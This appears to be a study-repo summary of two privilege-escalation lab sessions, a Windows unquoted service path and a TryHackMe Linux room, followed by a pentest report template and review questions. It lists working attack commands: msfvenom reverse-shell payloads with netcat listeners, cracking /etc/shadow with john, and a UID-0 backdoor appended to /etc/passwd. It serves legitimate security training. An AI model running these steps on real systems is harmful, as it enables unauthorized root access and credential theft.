# Lab Session Log — Summary & Documentation Template

> Professional documentation is a core skill, not an afterthought. This file (a) summarizes the two hands-on sessions this repo is built from, and (b) provides a **reusable template** for documenting your own future labs/engagements the way a real pentest report would.

---

## Session 1: Windows Privilege Escalation — Unquoted Service Path

| Field | Detail |
|---|---|
| **Objective** | Escalate from standard user to `NT AUTHORITY\SYSTEM` |
| **Target** | Windows 10 x64 VM, service `unquotedsvc` |
| **Vulnerability Class** | CWE-428: Unquoted Search Path or Element |
| **Initial Access** | `msfvenom`-generated reverse shell (`reverse.exe`), delivered via Python HTTP server, caught with `netcat` |
| **Escalation Path** | Enumerated unquoted service paths → confirmed writable directory via `accesschk64.exe` → confirmed `LocalSystem` run-as account via `sc qc` → planted second payload named to match the resolution gap → triggered via `net start` |
| **Result** | `NT AUTHORITY\SYSTEM` shell obtained |
| **Full technical writeup** | [`01-windows-privesc/01-unquoted-service-path.md`](../01-windows-privesc/01-unquoted-service-path.md) |

**Key commands used (chronological):**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=4444 -f exe -o reverse.exe
python3 -m http.server 80
nc -lnvp 4444
whoami /priv
wmic service get name,pathname | findstr /v /i "system32" | findstr /v \"
accesschk64.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
sc qc unquotedsvc
msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=1111 -f exe -o Common.exe
copy Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
nc -lnvp 1111
net start unquotedsvc
whoami   →  nt authority\system
```

---

## Session 2: Linux Privilege Escalation — TryHackMe "Linux PrivEsc" Room

| Field | Detail |
|---|---|
| **Objective** | Escalate from `user` to `root` on a Debian VM across multiple independent misconfiguration classes |
| **Target** | TryHackMe "Linux PrivEsc" room (Tib3rius, based on Sagi Shahar's workshop) |
| **Initial Access** | Provided credentials via SSH (`user:password321`) |
| **Techniques Practiced** | (1) Readable `/etc/shadow` + offline cracking, (2) Writable `/etc/shadow` hash overwrite, (3) Writable `/etc/passwd` UID-0 backdoor, plus room coverage of sudo misconfigurations and cron job abuse |
| **Result** | Root access achieved via multiple independent paths |
| **Full technical writeups** | [`02-linux-privesc/`](../02-linux-privesc/) directory |

**Key commands used (chronological, Task 3 — readable shadow):**
```
ssh user@<IP>
ls -l /etc/shadow
cat /etc/shadow
echo '<root_hash_line>' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt   →  password123
su root
```

**Key commands used (Task 5 — writable passwd):**
```
openssl passwd -6 newpassword1
echo 'newroot:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
id   →  uid=0(root) gid=0(root) groups=0(root)
```

---

## 📝 Reusable Lab/Engagement Documentation Template

Copy this template for every future lab or authorized engagement. Good notes now save you hours during report-writing later, and this habit is exactly what separates hobbyist CTF players from professional consultants.

```markdown
# [Target Name] — Privilege Escalation Writeup

## Overview
- Target:
- Date:
- Objective:
- Scope/Authorization reference:

## Reconnaissance
- Initial access method:
- User context obtained:
- OS/version:

## Enumeration
| Check performed | Command | Result |
|---|---|---|
|   |         |        |

## Vulnerability Identified
- Class/CWE:
- Description:
- Evidence (screenshot/output):

## Exploitation Steps
1.
2.
3.

## Result
- Privilege obtained:
- Proof (whoami/id output):

## Root Cause
-

## Remediation Recommendations
1.
2.

## Detection Opportunities (Blue Team)
-

## Lessons Learned / Notes for Next Time
-
```

---

## 🎓 Reflection Questions (Test Your Retention)

Try answering these **without looking back** at the technique files. This is the single best way to confirm you actually learned the material, not just skimmed it:

1. Why does Windows execute `C:\Program Files\Unquoted Path Service\Common.exe` *before* the real service binary, when the path is unquoted?
2. What two conditions must BOTH be true for an unquoted service path to actually be exploitable (not just "unquoted")?
3. What's the difference in exploitation speed/complexity between a readable `/etc/shadow` and a writable one?
4. Why does adding a user with UID `0` to `/etc/passwd` grant root access, even with a completely different username than `root`?
5. Why does `sudo` allowing `vim` effectively grant full root shell access?
6. What is `LD_PRELOAD`, and why is preserving it in `sudoers`' `env_keep` dangerous?
7. In cron PATH hijacking, what TWO facts do you need to confirm before it's actually exploitable?
8. Name three tools/resources you'd use to *automate* discovery of each of the above (one Windows tool, one Linux tool, one lookup website).

*(Answers are all in the corresponding technique files in this repo — if you got stuck, that's your cue on what to re-read.)*
